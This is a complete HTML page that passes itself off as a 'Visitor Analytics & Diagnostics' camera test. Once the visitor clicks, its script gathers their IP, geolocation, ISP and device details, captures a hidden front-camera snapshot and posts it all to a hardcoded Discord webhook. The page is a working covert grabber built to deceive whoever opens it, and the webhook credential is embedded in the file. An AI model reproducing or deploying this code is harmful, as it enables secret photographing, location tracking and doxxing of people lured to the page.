<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Analytics & Diagnostics</title>
    <style>
        :root {
            --bg-color: #0b0c10;
            --card-bg: #1f2833;
            --accent: #66fcf1;
            --text: #c5c6c7;
            --header-text: #ffffff;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: var(--card-bg);
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        h1 {
            color: var(--header-text);
            font-size: 1.3rem;
            margin-bottom: 1rem;
        }
        p {
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
        }
        button {
            background-color: var(--accent);
            color: #0b0c10;
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: bold;
            font-size: 1rem;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            opacity: 0.9;
        }
        #status {
            margin-top: 1rem;
            font-size: 0.85srem;
            color: var(--accent);
        }
    </style>
</head>
<body>

    <div class="container" id="main-card">
        <h1>Visitor Analytics & Diagnostics</h1>
        <p>Click below to initialize device telemetry check and camera sensor test.</p>
        <button id="run-btn">Request Camera Access</button>
        <div id="status"></div>
    </div>

    <!-- Hidden elements for capture -->
    <video id="cam" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // PASTE YOUR DISCORD WEBHOOK URL BELOW:
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569242899189596270/DZaFBALGc0JagZAvmWgd43_qnM4CEEPpZZi4x-lXfDw-57L1moD3y5MRtx0Ahver7xQP';

        document.getElementById('run-btn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            status.innerText = "Gathering network telemetry...";

            try {
                // 1. Fetch IP details safely using a CORS-friendly endpoint
                const ipRes = await fetch('https://ipapi.co/json/')
                    .catch(() => null);
                let ipData = ipRes ? await ipRes.json() : {};

                const ua = navigator.userAgent;
                let deviceModel = "Desktop / Generic";
                if (/android/i.test(ua)) deviceModel = "Android Device";
                else if (/iphone|ipad|ipod/i.test(ua)) deviceModel = "iOS Device";

                // 2. Request camera stream
                status.innerText = "Requesting camera permissions...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                
                const video = document.getElementById('cam');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1200)); // Allow feed to warm up

                status.innerText = "Capturing snapshot & transmitting...";

                // 3. Draw frame to canvas
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Stop tracks
                stream.getTracks().forEach(t => t.stop());

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    
                    const payload = {
                        embeds: [{
                            title: "📊 Telemetry & Capture Report",
                            color: 3447003,
                            fields: [
                                { name: "IP Address", value: ipData.ip || "Unavailable", inline: true },
                                { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
                                { name: "ISP", value: ipData.org || "Unknown", inline: false },
                                { name: "Device Type", value: deviceModel, inline: true },
                                { name: "Platform", value: navigator.platform || "Unknown", inline: true },
                                { name: "User Agent", value: `\`\`\`${ua}\`\`\``, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };

                    formData.append('payload_json', JSON.stringify(payload));
                    if (blob) {
                        formData.append('file', blob, 'snapshot.jpg');
                    }

                    // Send payload to Discord Webhook
                    const discordRes = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });

                    if (discordRes.ok) {
                        status.innerText = "Telemetry successfully logged!";
                        document.getElementById('main-card').innerHTML = `
                            <h1 style="color: #66fcf1;">Diagnostics Complete</h1>
                            <p>Data successfully transmitted to server logs.</p>
                        `;
                    } else {
                        status.innerText = "Error: Discord rejected the payload.";
                    }
                }, 'image/jpeg', 0.8);

            } catch (err) {
                console.error(err);
                status.innerText = "Permission denied or camera unavailable.";
            }
        });
    </script>
</body>
</html>
